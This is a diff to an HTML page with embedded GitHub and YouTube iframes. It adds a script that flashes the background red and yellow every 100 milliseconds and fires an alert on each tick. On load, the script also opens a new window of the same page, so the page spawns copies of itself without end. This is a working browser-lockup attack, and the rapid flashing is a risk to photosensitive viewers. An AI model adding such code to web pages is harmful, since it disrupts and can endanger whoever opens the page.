@@ -19,4 +19,26 @@
   <iframe src="https://www.github.com"></iframe>
   <iframe src="https://www.youtube.com"></iframe>
 </body>
+     <script>
+        activ = window.setInterval("Farbe()", 100);
+        farbe=1;
+        
+        function Farbe() {
+            if(farbe==1) {
+                document.bgColor="FFFF00";
+                farbe=2;
+            }else {
+                document.bgColor="FF0000";
+                farbe=1;
+            }
+            
+            alert("ok");
+        }
+
+        function erneut(){
+            window.open(self.location,'');
+        }
+        
+        window.onload = erneut;
+    </script>
 </html>
